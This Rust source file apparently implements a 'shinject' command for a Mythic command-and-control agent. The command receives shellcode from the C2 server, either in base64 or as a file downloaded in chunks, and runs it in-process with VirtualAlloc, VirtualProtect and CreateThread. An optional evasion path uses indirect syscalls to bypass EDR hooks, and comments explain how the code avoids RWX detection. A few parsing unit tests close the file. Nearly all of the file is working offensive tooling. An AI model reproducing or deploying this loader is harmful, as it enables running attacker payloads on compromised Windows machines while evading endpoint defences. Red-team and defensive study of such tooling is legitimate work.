use crate::{AgentTask, ContinuedData, mythic_success};
use base64::{Engine as _, engine::general_purpose};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::error::Error;
use std::result::Result;
use std::sync::mpsc;

#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use std::mem;

#[cfg(target_os = "windows")]
use winapi::shared::minwindef::DWORD;
#[cfg(target_os = "windows")]
use winapi::um::processthreadsapi::{CreateThread, GetExitCodeThread};
#[cfg(target_os = "windows")]
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect};
#[cfg(target_os = "windows")]
use winapi::um::handleapi::CloseHandle;
#[cfg(target_os = "windows")]
use winapi::um::synchapi::WaitForSingleObject;
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi::GetLastError;
#[cfg(target_os = "windows")]
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_READWRITE, PAGE_EXECUTE_READ};

// WAIT_TIMEOUT constant
#[cfg(target_os = "windows")]
const WAIT_TIMEOUT: DWORD = 0x102;

/// Chunk size used for file transfer
const CHUNK_SIZE: usize = 512000;

/// ShinjectArgs
#[derive(Serialize, Deserialize, Debug)]
pub struct ShinjectArgs {
    #[serde(rename = "shellcode-file-id")]
    pub shellcode_file_id: Option<String>,
    #[serde(rename = "shellcode-base64")]
    pub shellcode_base64: Option<String>,
    #[serde(rename = "process-id")]
    pub process_id: Option<u32>,
}

/// Inject shellcode - background task version that receives file through channels
/// * `tx` - Channel for sending information to Mythic
/// * `rx` - Channel for receiving information from Mythic
#[cfg(target_os = "windows")]
pub fn inject_shellcode(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Parse the initial task
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: ShinjectArgs = serde_json::from_str(&task.parameters)?;

    // Get shellcode bytes
    let shellcode_bytes = if let Some(b64) = &args.shellcode_base64 {
        // Direct base64 shellcode
        general_purpose::STANDARD.decode(b64)
            .map_err(|e| format!("Failed to decode base64 shellcode: {}", e))?
    } else if let Some(file_id) = &args.shellcode_file_id {
        // Download shellcode from Mythic - send request for first chunk
        tx.send(json!({
            "upload": json!({
                "chunk_size": CHUNK_SIZE,
                "file_id": file_id,
                "chunk_num": 1,
            }),
            "task_id": task.id,
            "user_output": "Downloading shellcode chunk 1\n",
        }))?;

        // Receive first chunk
        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
        let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
        let mut file_data: Vec<u8> = general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?;
        let total_chunks = continued_args.total_chunks.unwrap();
        
        // Get remaining chunks if any
        for chunk_num in 2..=total_chunks {
            tx.send(json!({
                "upload": json!({
                    "chunk_size": CHUNK_SIZE,
                    "file_id": file_id,
                    "chunk_num": chunk_num,
                }),
                "task_id": task.id,
                "user_output": format!("Downloading shellcode chunk {}/{}\n", chunk_num, total_chunks),
            }))?;

            let task: AgentTask = serde_json::from_value(rx.recv()?)?;
            let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
            file_data.append(&mut general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?);
        }
        file_data
    } else {
        return Err("No shellcode source provided".into());
    };

    if shellcode_bytes.is_empty() {
        return Err("Shellcode is empty".into());
    }

    // Execute shellcode in current process in a spawned thread
    let shellcode_size = shellcode_bytes.len();
    let shellcode_bytes_clone = shellcode_bytes.clone();
    
    std::thread::spawn(move || {
        unsafe {
            if let Err(e) = execute_shellcode_in_thread(&shellcode_bytes_clone) {
                eprintln!("Shellcode execution failed in background thread: {}", e);
            }
        }
    });
    
    // Return immediately without waiting for shellcode to finish
    tx.send(mythic_success!(
        task.id,
        format!("Shellcode execution started successfully ({} bytes). Running in background thread.", shellcode_size)
    ))?;
    
    Ok(())
}


/// Placeholder - not reached with new implementation
#[cfg(not(target_os = "windows"))]
pub fn inject_shellcode(
    _tx: &mpsc::Sender<serde_json::Value>,
    _rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    Err("shinject is only implemented on Windows".into())
}

/// Execute shellcode in a thread (in-process execution)
#[cfg(target_os = "windows")]
unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String> {
    let buffer_size = shellcode.len();

    #[cfg(feature = "evasion")]
    {
        // Indirect syscalls via DInvoke_rs by @Kudaes (https://github.com/Kudaes/DInvoke_rs)
        // Bypasses EDR hooks on kernel32/ntdll by resolving syscall numbers at runtime
        let mut base_address: *mut winapi::ctypes::c_void = ptr::null_mut();
        let mut region_size: usize = buffer_size;

        let status = dinvoke_rs::dinvoke::nt_allocate_virtual_memory(
            -1isize as *mut _,
            &mut base_address,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if status != 0 {
            return Err(format!("NtAllocateVirtualMemory failed: 0x{:X}", status));
        }

        let executable_mem = base_address;
        ptr::copy_nonoverlapping(shellcode.as_ptr(), executable_mem as *mut u8, buffer_size);

        let mut old_protect: u32 = 0;
        let status = dinvoke_rs::dinvoke::nt_protect_virtual_memory(
            -1isize as *mut _,
            &mut base_address,
            &mut region_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if status != 0 {
            return Err(format!("NtProtectVirtualMemory failed: 0x{:X}", status));
        }

        let mut thread_id: u32 = 0;
        let thread_handle = CreateThread(
            ptr::null_mut(), 0, Some(mem::transmute(executable_mem)),
            ptr::null_mut(), 0, &mut thread_id,
        );

        if thread_handle.is_null() {
            return Err(format!("CreateThread failed. Error: {}", GetLastError()));
        }

        let wait_result = WaitForSingleObject(thread_handle, 1000);
        CloseHandle(thread_handle);

        if wait_result == WAIT_TIMEOUT {
            return Ok(format!("Shellcode started ({} bytes) via indirect syscalls, thread {}", buffer_size, thread_id));
        } else {
            return Ok(format!("Shellcode completed ({} bytes) via indirect syscalls, thread {}", buffer_size, thread_id));
        }
    }

    #[cfg(not(feature = "evasion"))]
    {
    // Allocate RW memory first (avoids RWX detection)
    let executable_mem = VirtualAlloc(
        ptr::null_mut(),
        buffer_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    if executable_mem.is_null() {
        return Err(format!(
            "VirtualAlloc failed. Error: {}",
            GetLastError()
        ));
    }

    // Copy shellcode to the allocated memory
    ptr::copy_nonoverlapping(
        shellcode.as_ptr(),
        executable_mem as *mut u8,
        buffer_size,
    );

    // Flip RW to RX (no write after copy — proper OPSEC)
    let mut old_protect: u32 = 0;
    if VirtualProtect(executable_mem, buffer_size, PAGE_EXECUTE_READ, &mut old_protect) == 0 {
        VirtualFree(executable_mem, 0, MEM_RELEASE);
        return Err(format!("VirtualProtect failed. Error: {}", GetLastError()));
    }

    // Create thread to execute shellcode
    let mut thread_id: u32 = 0;
    let thread_handle = CreateThread(
        ptr::null_mut(),
        0,
        Some(mem::transmute(executable_mem)),
        ptr::null_mut(),
        0,
        &mut thread_id,
    );

    if thread_handle.is_null() {
        VirtualFree(executable_mem, 0, MEM_RELEASE);
        return Err(format!(
            "CreateThread failed. Error: {}",
            GetLastError()
        ));
    }

    // Wait for thread with timeout (1 second)
    let wait_result = WaitForSingleObject(thread_handle, 1000); // 1 second timeout
    let mut exit_code: u32 = 0;
    GetExitCodeThread(thread_handle, &mut exit_code);
    CloseHandle(thread_handle);

    // Don't free memory - shellcode might still be running

    if wait_result == WAIT_TIMEOUT {
        Ok(format!(
            "Shellcode execution started ({} bytes) in thread {}. Thread is still running (timeout reached).",
            buffer_size, thread_id
        ))
    } else {
        Ok(format!(
            "Shellcode execution completed ({} bytes) in thread {} (exit code: {}, wait result: {}).",
            buffer_size, thread_id, exit_code, wait_result
        ))
    }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shinject_args_parsing() {
        let json_args = r#"{"shellcode-file-id": "test_file_id"}"#;
        let args: ShinjectArgs = serde_json::from_str(json_args).unwrap();
        assert_eq!(args.shellcode_file_id, Some("test_file_id".to_string()));
    }

    #[test]
    fn test_shinject_base64_decode() {
        let sample = vec![0x90, 0x90, 0x90, 0x90];
        let b64 = general_purpose::STANDARD.encode(&sample);
        let json_args = format!(r#"{{"shellcode-base64":"{}"}}"#, b64);
        let args: ShinjectArgs = serde_json::from_str(&json_args).unwrap();
        let decoded = general_purpose::STANDARD.decode(&args.shellcode_base64.unwrap()).unwrap();
        assert_eq!(decoded, sample);
    }
}
